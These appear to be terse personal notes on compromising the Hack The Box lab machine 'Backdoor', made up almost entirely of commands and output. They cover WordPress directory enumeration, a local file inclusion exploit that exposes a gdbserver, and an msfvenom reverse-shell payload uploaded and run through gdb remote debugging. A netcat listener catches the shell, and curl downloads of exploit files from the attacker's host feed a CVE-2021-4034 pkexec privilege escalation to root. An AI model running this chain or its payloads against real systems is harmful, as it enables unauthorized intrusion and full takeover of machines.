

Steps:
Dirb
http://backdoor.htb/wp-content/plugins/

```
┌──(kali㉿kali)-[~/Documents/HTB/Backdoor]                                                                                                                                                                                                  
└─$ dirb http://backdoor.htb                                                                                                                                                                                                                
                                                                                                                                                                                                                                            
-----------------                                                                                                                                                                                                                           
DIRB v2.22                                                                                                                                                                                                                                  
By The Dark Raver                                                                                                                                                                                                                           
-----------------                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
START_TIME: Fri Feb 25 14:11:16 2022                                                                                                                                                                                                        
URL_BASE: http://backdoor.htb/                                                                                                                                                                                                              
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                                                                                                                        
                                                                                                                                                                                                                                            -----------------                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
GENERATED WORDS: 4612                                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
---- Scanning URL: http://backdoor.htb/ ----                                                                                                                                                                                                
+ http://backdoor.htb/index.php (CODE:301|SIZE:0)                                                                                                                                                                                           
+ http://backdoor.htb/server-status (CODE:403|SIZE:277)                                                                                                                                                                                     
==> DIRECTORY: http://backdoor.htb/wp-admin/                                                                                                                                                                                                
==> DIRECTORY: http://backdoor.htb/wp-content/                                                                                                                                                                                              
==> DIRECTORY: http://backdoor.htb/wp-includes/                                                                                                                                                                                             
+ http://backdoor.htb/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                                                                                         
                                                                                                                                                                                                                                            
---- Entering directory: http://backdoor.htb/wp-admin/ ---- 
+ http://backdoor.htb/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                  
==> DIRECTORY: http://backdoor.htb/wp-admin/css/                                                                                                                                                                                            
==> DIRECTORY: http://backdoor.htb/wp-admin/images/                                                                                                                                                                                         
==> DIRECTORY: http://backdoor.htb/wp-admin/includes/                                                                                                                                                                                       
+ http://backdoor.htb/wp-admin/index.php (CODE:302|SIZE:0)                                                                                                                                                                                  
==> DIRECTORY: http://backdoor.htb/wp-admin/js/                                                                                                                                                                                             
==> DIRECTORY: http://backdoor.htb/wp-admin/maint/                                                                                                                                                                                          
==> DIRECTORY: http://backdoor.htb/wp-admin/network/                                                                                                                                                                                        
==> DIRECTORY: http://backdoor.htb/wp-admin/user/                                                                                                                                                                                           
                                                                                                                                                                                                                                            
---- Entering directory: http://backdoor.htb/wp-content/ ----
+ http://backdoor.htb/wp-content/index.php (CODE:200|SIZE:0)                                                                                                                                                                                
==> DIRECTORY: http://backdoor.htb/wp-content/plugins/                                                                                                                                                                                      
==> DIRECTORY: http://backdoor.htb/wp-content/themes/                                                                                                                                                                                       
==> DIRECTORY: http://backdoor.htb/wp-content/upgrade/                                                                                                                                                                                      
==> DIRECTORY: http://backdoor.htb/wp-content/uploads/   
```

https://www.exploit-db.com/exploits/39575

https://github.com/mthbernardes/LFI-Enum

Had to edit it

PID: 809        ../../../../../../../proc/809/cmdline../../../../../../../proc/809/cmdline../../../../../../../proc/809/cmdline/bin/sh while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done <script>win
dow.close()</script>                                                                                                                                                                                                                        
PID: 815        ../../../../../../../proc/815/cmdline../../../../../../../proc/815/cmdline../../../../../../../proc/815/cmdline/bin/sh while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done <script>wind$
w.close()</script>

https://sourceware.org/gdb/onlinedocs/gdb/Server.html
https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf
chmod +x binary.elf
gdb binary.elf
# Set remote debuger target
target extended-remote 10.10.10.11:1337
# Upload elf file
remote put binary.elf binary.elf
# Set remote executable file
set remote exec-file /home/user/binary.elf
# Execute reverse shell executable
run
```

(gdb) target extended-remote 10.10.11.125:1337
`target:/home/user/binary.elf' has disappeared; keeping its symbols.
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
(gdb) remote put binary.elf binary.elf
Successfully sent file "binary.elf".
(gdb) set remote exec-file /home/user/binary.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
`target:/home/user/binary.elf' has disappeared; keeping its symbols.
Starting program:  
Reading /home/user/binary.elf from remote target...
Reading /home/user/binary.elf from remote target...
Reading symbols from target:/home/user/binary.elf...
(No debugging symbols found in target:/home/user/binary.elf)
┌──(kali㉿kali)-[~/Documents/HTB/Backdoor]                                                                                                                                                                                                  
└─$ nc -nvlp 6969                                                                                                                                                                                                                           
listening on [any] 6969 ...                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
ls                                                                                                                                                                                                                                          
whoami                                                                                                                                                                                                                                      
ls                                                                                                                                                                                                                                          
ls                                                                                                                                                                                                                                          
ls                                                                                                                                                                                                                                          
connect to [10.10.14.231] from (UNKNOWN) [10.10.11.125] 38176                                                                                                                                                                               
binary.elf
revshell.elf
user.txt
user
binary.elf
revshell.elf
user.txt
binary.elf
revshell.elf
user.txt
binary.elf
revshell.elf
user.txt
ls

/usr/bin/python3 -c 'import pty; pty.spawn("/bin/sh")'


```
root         809  0.0  0.0   2608  1652 ?        Ss   11:47   0:14      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done

╔══════════╣ Sudo version                                                                                                                                                                                                                   
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                                                  
Sudo version 1.8.31                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
Vulnerable to CVE-2021-4034 
```

```
$ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c                                                                                                                                                                                     
curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c                                                                                                                                                                                       
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                                                               
100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   873                                                                                                                                                              
$ curl http://10.10.14.231:8000/exploit.c -o exploit.c                                                                                                                                                                                      
curl http://10.10.14.231:8000/exploit.c -o exploit.c                                                                                                                                                                                        
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                                                               
100   555  100   555    0     0   2747      0 --:--:-- --:--:-- --:--:--  2747                                                                                                                                                              
$ curl http://10.10.14.231:8000/makefile -o makefile                                                                                                                                                                                        
curl http://10.10.14.231:8000/makefile -o makefile                                                                                                                                                                                          
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                                                               
100   148  100   148    0     0    740      0 --:--:-- --:--:-- --:--:--   740                                                                                                                                                              
$ make                                                                                                                                                                                                                                      
make                                                                                                                                                                                                                                        
/bin/sh: 15: make: not found
$ curl http://10.10.14.231:8000/exploit -o exploit                                                                                                                                                                                          
curl http://10.10.14.231:8000/exploit -o exploit                                                                                                                                                                                            
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
                                 Dload  Upload   Total   Spent    Left  Speed
100 16176  100 16176    0     0  53562      0 --:--:-- --:--:-- --:--:-- 53562
$ curl http://10.10.14.231:8000/evil.so -o evil.so
curl http://10.10.14.231:8000/evil.so -o evil.so
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15584  100 15584    0     0  51432      0 --:--:-- --:--:-- --:--:-- 51263
$ ./exploit
./exploit
# whoami
whoami
root

```
